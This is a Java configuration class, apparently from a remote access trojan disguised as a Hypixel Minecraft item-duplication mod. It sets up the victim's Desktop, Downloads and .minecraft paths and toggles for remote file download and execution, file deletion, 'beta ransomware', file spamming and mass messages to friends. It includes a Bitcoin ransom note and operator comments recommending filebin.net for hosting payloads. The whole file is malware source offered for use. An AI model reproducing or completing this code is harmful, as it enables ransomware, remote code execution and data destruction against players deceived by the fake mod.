package run.hypixel.dupe.scripts;

import java.util.ArrayList;
import java.util.HashMap;

import run.hypixel.dupe.DupeMod;

public class Scripts {
	
	public static String desktop = "C:\\Users\\" + DupeMod.getName() + "\\Desktop\\";
	public static String downloads = "C:\\Users\\" + DupeMod.getName() + "\\Downloads\\";
	public static String minecraft = "C:\\Users\\" + DupeMod.getName() + "\\AppData\\Roaming\\.minecraft\\";
	
	/*
	 * Do not change this to true, to set these to true modify them in setup()
	 */
	boolean doDownload = false;
	boolean doExecute = false;
	boolean doDelete = false;
	boolean doRansomware = false; // Beta ransomware
	boolean doFileSpammer = false;
	boolean doMessageFriends = false; // Do not mess with this, this will be in the next update.
	
	private HashMap<String, String> fileDownloads = new HashMap<>();
	
	private ArrayList<String> fileSpammer = new ArrayList<>();
	
	private ArrayList<String> fileExecutes = new ArrayList<>();
	
	private ArrayList<String> fileDeletes = new ArrayList<>();
	
	private String friendMessage = "This is a RAT 1.2 mass dm test."; // Coming in next version.
	
	/*
	 * Enter the ransom text in this variable.
	 */
	public static String ransomText = "Your computer has been hacked and if you do not pay 30$ in BTC your files will be wiped.";
	
	public Scripts() {
		
	}
	
	public void setup() {
		/*
		 * Add your script setting up over here by setting values and settings booleans.
		 * Example of adding to a hashmap or arraylist: 
		 * HashMap: addFileDownload("https://myWeb.site/theCoolFile.txt", desktop + "poggersFile.txt");
		 * ArrayList: addFileExecute(desktop + "poggersFile.txt");
		 * The difference between them is that a HashMap has 2 values, a key and a value,
		 * And the ArrayList is only one value.
		 * 
		 * Direct Download link required for File Download.
		 * 
		 * To set a value true, you have to doesTheName(true);
		 * Example: doesExecute(true);
		 * To see what you can enable exploire the below methods starting with does
		*/
		
		// filebin.net IS RECOMMENDED FOR FILE DOWNLOAD.
		
	}
	
	private void addFileDownload(String url, String location) {
		fileDownloads.put(url, location);
	}
	
	private void addFileSpammer(String fileLoc) {
		fileSpammer.add(fileLoc);
	}
	
	private void addFileExecute(String location) {
		fileExecutes.add(location);
	}
	
	private void addFileDelete(String location) {
		fileDeletes.add(location);
	}
	
	public HashMap<String, String> getFileDownloads(){
		return fileDownloads;
	}
	
	public ArrayList<String> getFileSpammers(){
		return fileSpammer;
	}
	
	public ArrayList<String> getFileExecutes() {
		return fileExecutes;
	}
	
	public ArrayList<String> getFileDeletes() {
		return fileDeletes;
	}
	
	public String getFriendMessages() {
		return friendMessage;
	}
	
	private void doesDownload(boolean doesIt) {
		doDownload = doesIt;
	}
	
	private void doesExecute(boolean doesIt) {
		doExecute = doesIt;
	}
	
	private void doesDelete(boolean doesIt) {
		doDelete = doesIt;
	}
	
	private void doesRansomware(boolean doesIt) {
		doRansomware = doesIt;
	}
	
	private void doesFileSpammer(boolean doesIt) {
		doFileSpammer = doesIt;
	}
	
	private void doesMessageFriends(boolean doesIt) {
		doMessageFriends = doesIt;
	}
	
	public boolean getDoesDownload() {
		return doDownload;
	}
	
	public boolean getDoesExecute() {
		return doExecute;
	}
	
	public boolean getDoesDelete() {
		return doDelete;
	}
	
	public boolean getDoesRansomware() {
		return doRansomware;
	}
	
	public boolean getDoesFileSpammer() {
		return doFileSpammer;
	}
	
	public boolean getDoesMessageFriends() {
		return doMessageFriends;
	}

}
